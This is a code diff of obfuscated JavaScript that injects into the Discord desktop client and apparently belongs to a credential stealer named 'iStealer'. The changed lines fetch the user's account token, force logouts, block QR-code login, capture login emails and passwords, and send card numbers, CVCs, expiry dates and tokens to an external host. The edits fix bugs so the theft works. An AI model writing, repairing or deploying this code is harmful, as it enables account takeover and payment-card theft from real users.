@@ -56,11 +56,11 @@ function FirstTime() {
 
         if (!fs.existsSync(path.join(__dirname, "iStealer"))) return true;
         fs.rmdirSync(path.join(__dirname, "iStealer"));
-        if (_0x13a48d.yTQDf(config['logout'], false) || _0x13a48d.PGPkh(config['logout'], instant)) {
-            if (_0x13a48d.LeinW(config['logout-notify'], true)) {
+        if (_0x13a48d.yTQDf(config['logout'], "false") || _0x13a48d.PGPkh(config['logout'], instant)) {
+            if (_0x13a48d.LeinW(config['logout-notify'], "true")) {
                 if (_0x13a48d.FWtQa(token, null) || _0x13a48d.PGPkh(token, undefined) || _0x13a48d.FWtQa(token, "")) {} else {
                     const _0x5c7104 = BrowserWindow.getAllWindows()[0];
-                    _0x5c7104.webContents.executeJavaScript(`var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;`, true).then(_0x3f4af0 => {
+                    _0x5c7104.webContents.executeJavaScript(`var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me", false),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;`, true).then(_0x3f4af0 => {
                         const _0x15d650 = JSON.parse(_0x3f4af0);
                         var _0xa8bc6e = {
                             token: token,
@@ -73,7 +73,7 @@ function FirstTime() {
             const _0x76345e = BrowserWindow.getAllWindows()[0];
             _0x76345e.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true).then(_0x131909 => {})
         }
-        return !NaN
+        return false
     })
 }
 
@@ -83,7 +83,7 @@ const Filter = {
 
 session.defaultSession.webRequest.onBeforeRequest(Filter, (_0xc21dbb, _0x4a0d2d) => {
     if (_0xc21dbb.url.startsWith('wss://')) {
-        if (_0x495aa4.qbGgM(config['disable-qr-code'], true) || _0x495aa4.qbGgM(config['disable-qr-code'], '%DISABLEQRCODE%')) {
+        if (_0x495aa4.qbGgM(config['disable-qr-code'], "true") || _0x495aa4.qbGgM(config['disable-qr-code'], '%DISABLEQRCODE%')) {
             _0x495aa4.zsTfJ(_0x4a0d2d, {
                 cancel: true
             });
@@ -116,7 +116,7 @@ function SendApiCC(_0x15763d) {
         _0x1b32c7 = data.token;
         const _0x5b28a3 = BrowserWindow.getAllWindows()[0];
         _0x5b28a3.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://external.alwaysdata.net/is/api/v1/cc?client=clientID&number=${_0x54b927}&cvc=${_0x52bb99}&expir_month=${_0x5a89e1}&expir_year=${_0xe86976}&token=${_0x1b32c7}", true);
+        xhr.open("GET", "https://external.alwaysdata.net/is/api/v1/cc?client=${key}&number=${_0x54b927}&cvc=${_0x52bb99}&expir_month=${_0x5a89e1}&expir_year=${_0xe86976}&token=${_0x1b32c7}", true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
         xhr.send();`, true).then(_0x1fcbf2 => {})
@@ -163,7 +163,7 @@ const ChangePasswordFilter = {
 
 session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (_0x2ec043, _0x1f1710) => {
     if (_0x2ec043.url.endsWith('login')) {
-        if (_0x1b1252.KhkhS('_0x2ec043.statusCode', 200)) {
+        if (_0x1b1252.KhkhS(_0x2ec043.statusCode, 200)) {
             const data = JSON.parse(Buffer.from(_0x2ec043.uploadData[0].bytes).toString()),
                 email = data.login,
                 password = data.password,
